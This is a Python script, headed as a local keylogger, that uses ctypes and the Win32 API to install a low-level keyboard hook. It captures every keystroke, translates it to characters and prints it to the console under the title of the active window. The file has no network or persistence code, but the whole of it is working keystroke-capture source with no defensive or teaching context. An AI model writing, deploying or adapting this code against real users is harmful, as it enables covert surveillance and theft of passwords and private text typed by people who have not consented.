# Using win32 API to implement a local keylogger
from ctypes import *
from ctypes import wintypes

user32 = windll.user32

LRESULT = c_long
WH_KEYBOARD_LL = 13

WM_KEYDOWN = 0x0100
WM_RETURN = 0x0D
WM_SHIFT = 0x10

GetWindowTextLengthA = user32.GetWindowTextLengthA
GetWindowTextLengthA.argtypes = (wintypes.HANDLE, )
GetWindowTextLengthA.restye = wintypes.INT

GetWindowTextA = user32.GetWindowTextA
GetWindowTextA.argtypes = (wintypes.HANDLE, wintypes.LPSTR, wintypes.INT)
GetWindowTextA.restype = wintypes.INT

GetKeyState = user32.GetKeyState
GetKeyState.argtypes = (wintypes.INT, )
GetKeyState.restype = wintypes.SHORT

# define array for keyboard state
keyboard_state = wintypes.BYTE * 256
GetKeyboardState = user32.GetKeyboardState
GetKeyboardState.argtypes = (POINTER(keyboard_state),)
GetKeyboardState.restype = wintypes.BOOL

ToAscii = user32.ToAscii
ToAscii.argtypes = (wintypes.UINT, wintypes.UINT, POINTER(keyboard_state), wintypes.LPWORD, wintypes.UINT)
ToAscii.restype = wintypes.INT

CallNextHookEx = user32.CallNextHookEx
CallNextHookEx.argtypes = (wintypes.HHOOK, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)
CallNextHookEx.restype = LRESULT

HOOKPROC = CFUNCTYPE(LRESULT, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)

SetWindowsHookExA = user32.SetWindowsHookExA
SetWindowsHookExA.argtypes = (wintypes.INT, HOOKPROC, wintypes.HINSTANCE, wintypes.DWORD)
SetWindowsHookExA.restype = wintypes.HHOOK

GetMessageA = user32.GetMessageA
GetMessageA.argtypes = (wintypes.LPMSG, wintypes.HWND, wintypes.UINT, wintypes.UINT)
GetMessageA.restype = wintypes.BOOL

class KBDLLHOOKSTRUCT(Structure):
	_fields_ = [("vkCode", wintypes.DWORD),
				("scanCode", wintypes.DWORD),
				("flags", wintypes.DWORD),
				("time", wintypes.DWORD),
				("dwExtraInfo", wintypes.DWORD)]

def get_foreground_process():
	hwnd = user32.GetForegroundWindow()
	length = GetWindowTextLengthA(hwnd)
	buff = create_string_buffer(length + 1)
	GetWindowTextA(hwnd, buff, length + 1)
	return buff.value

# print(get_foreground_process())

# setup hook for keylogger

def hook_function(nCode, wParam, lParam):
	global last
	if last != get_foreground_process():
		last = get_foreground_process()
		print("\n[{}]".format(last.decode("latin-1")))

	if wParam == WM_KEYDOWN:
		keyboard = KBDLLHOOKSTRUCT.from_address(lParam)

		state = (wintypes.BYTE * 256)()
		GetKeyState(WM_SHIFT)
		GetKeyboardState(byref(state))

		buff = (c_ushort * 1)()
		n = ToAscii(keyboard.vkCode, keyboard.scanCode, state, buff, 0 )

		if n > 0:
			if keyboard.vkCode == WM_RETURN:
				print()
			else:
				print("{}".format(string_at(buff).decode("latin-1")), end="", flush=True)

	return CallNextHookEx(hook, nCode, wParam, lParam)

last = None

callback = HOOKPROC(hook_function)

hook = SetWindowsHookExA(WH_KEYBOARD_LL, callback, 0, 0)
GetMessageA(byref(wintypes.MSG()), 0, 0, 0)

